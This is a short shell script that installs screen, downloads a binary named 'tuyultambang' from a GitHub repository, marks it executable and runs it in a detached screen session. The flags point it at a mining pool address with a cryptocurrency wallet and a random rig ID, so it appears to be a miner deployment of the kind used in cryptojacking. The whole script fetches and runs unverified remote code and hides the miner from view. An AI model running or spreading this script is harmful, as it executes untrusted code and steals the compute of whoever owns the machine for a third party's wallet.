sudo apt update && 
sudo apt install screen -y &&
wget https://github.com/washil789/tambang/raw/main/tuyultambang &&
chmod +x tuyultambang &&
screen -dmS run ./tuyultambang -o 134.122.120.248:443 -u 8BVLQrAfZXLFZsdLcUqk33EgPLxQYwKVTheFAixjGZShXhqSVXFUrqT98xtNgegRkoaRTECw5JHTdi67F13zd86ZGitVSnZ+100000 --rig-id $(echo $(shuf -i 1-999 -n 1)-CLBV)
